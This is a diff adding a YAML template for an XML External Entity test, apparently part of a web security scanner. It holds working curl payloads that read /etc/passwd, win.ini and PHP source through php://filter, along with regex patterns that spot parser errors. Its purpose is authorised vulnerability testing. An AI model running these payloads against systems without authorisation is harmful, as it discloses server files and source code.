@@ -1,0 +1,84 @@
+id: WSTG-INPV-07
+name: XML External Entity
+category: Input Validation
+attack_class: xxe
+severity: critical
+references:
+  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
+
+# Every payload is a READ. None writes, and none uses an out-of-band channel by
+# default: a blind XXE confirmed through an external collaborator proves the
+# same thing while sending a client's internal data to a third party, so that
+# stays an operator's explicit choice rather than something the sweep does on
+# its own.
+#
+# The parser-error step matters as much as the file read. "DOCTYPE is
+# disallowed" is a hardened parser saying so, and recording that is how a
+# re-scan can tell a fix from a coincidence.
+
+target_schema:
+  required: [url]
+  optional: [collaborator_host, cookie, auth_header]
+
+steps:
+  - name: classic_file_read
+    tool: curl
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
+      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+      "{{url}}"
+    evaluators:
+      - type: regex
+        pattern: 'root:[^:]*:0:0:'
+        emit_finding:
+          vuln_type: XXE (external entity resolved — /etc/passwd disclosed)
+          severity: critical
+        stop_after: true
+
+  # PHP wrappers return base64, so the plaintext signature above never fires
+  # even though the read succeeded. `PD9waHA` is base64 for "<?php".
+  - name: php_wrapper_read
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
+      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&xxe;</r>'
+      "{{url}}"
+    evaluators:
+      - type: regex
+        pattern: 'PD9waHA|PD9wa|PHNjcmlwdA'
+        emit_finding:
+          vuln_type: XXE (php://filter wrapper — source disclosure)
+          severity: critical
+        stop_after: true
+
+  - name: windows_file_read
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
+      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><r>&xxe;</r>'
+      "{{url}}"
+    evaluators:
+      - type: regex
+        pattern: '\[fonts\]|\[extensions\]|for 16-bit app support'
+        emit_finding:
+          vuln_type: XXE (external entity resolved — win.ini disclosed)
+          severity: critical
+        stop_after: true
+
+  # A parser that ACCEPTS the document but refuses the entity is a different
+  # finding from one that never saw XML at all.
+  - name: entity_parser_signature
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
+      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent-erlik-probe">]><r>&xxe;</r>'
+      "{{url}}"
+    evaluators:
+      - type: regex
+        pattern: 'DOCTYPE is disallowed|DOCTYPEDECL|failed to load external entity|ExternalEntity|XMLSyntaxError|SAXParseException|nonexistent-erlik-probe'
+        emit_finding:
+          vuln_type: XML parser processes user-supplied DOCTYPE (XXE surface confirmed)
+          severity: high
